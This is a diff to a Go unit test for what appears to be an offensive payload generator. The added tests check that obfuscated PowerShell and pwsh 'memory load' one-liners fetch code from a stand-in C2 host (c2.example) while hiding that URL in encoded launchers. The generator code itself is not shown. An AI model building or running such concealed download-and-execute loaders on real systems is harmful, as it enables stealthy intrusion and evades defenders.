@@ -209,8 +209,8 @@ func TestBuildOneLiners_PS1VerifiedMemoryLoader(t *testing.T) {
 	const name = "PS1 Verified Memory Load (obfuscated)"
 	base := buildOneLiners("ps1", "Write-Output ok", "https://c2.example/p", "/tmp/p", "", "")
 	verified := buildOneLinersWithObfuscation("ps1", "Write-Output ok", "https://c2.example/p", "/tmp/p", "", "ABC123", obfuscation.PSObfuscateOptions{})
-	if len(verified) != len(base)+1 {
-		t.Fatalf("ps1 verified variants = %d, want base+1 (%d)", len(verified), len(base)+1)
+	if len(verified) != len(base)+2 {
+		t.Fatalf("ps1 verified variants = %d, want base+2 (obfuscated + pwsh), got %d", len(verified), len(base)+2)
 	}
 	cmd := findOneLiner(verified, name)
 	if cmd == "" {
@@ -237,5 +237,29 @@ func TestBuildOneLiners_PS1VerifiedMemoryLoader(t *testing.T) {
 	}
 	if strings.Contains(encCmd, "https://c2.example/p") {
 		t.Fatalf("encoded launcher leaked the URL: %s", encCmd)
+	}
+	pwshName := "PowerShell 7 (pwsh) Verified Memory Load"
+	pwshCmd := findOneLiner(verified, pwshName)
+	if !strings.HasPrefix(pwshCmd, "pwsh ") {
+		t.Fatalf("PS7 variant must launch pwsh explicitly: %s", pwshCmd)
+	}
+	if strings.Contains(pwshCmd, "https://c2.example/p") {
+		t.Fatalf("PS7 variant leaked the URL: %s", pwshCmd)
+	}
+	encPwsh := buildOneLinersWithObfuscation("ps1", "Write-Output ok", "https://c2.example/p", "", "", "ABC123", obfuscation.PSObfuscateOptions{Launcher: "encodedcommand", LauncherExe: "pwsh"})
+	if got := findOneLiner(encPwsh, name); !strings.HasPrefix(got, "pwsh ") || !strings.Contains(got, " -enc ") {
+		t.Fatalf("explicit pwsh preset must produce a pwsh -enc launcher: %s", got)
+	}
+	if findOneLiner(encPwsh, pwshName) != "" {
+		t.Fatal("no duplicate PS7 variant when the launcher is already pinned to pwsh")
+	}
+	for _, tc := range []struct{ in, want string }{{"", ""}, {"auto", ""}, {"PowerShell", "powershell"}, {" PWSH ", "pwsh"}} {
+		got, ok := normalizePowerShellExe(tc.in)
+		if !ok || got != tc.want {
+			t.Errorf("normalizePowerShellExe(%q) = %q,%v; want %q,true", tc.in, got, ok, tc.want)
+		}
+	}
+	if _, ok := normalizePowerShellExe("cmd.exe"); ok {
+		t.Fatal("arbitrary launcher executable must be rejected")
 	}
 }
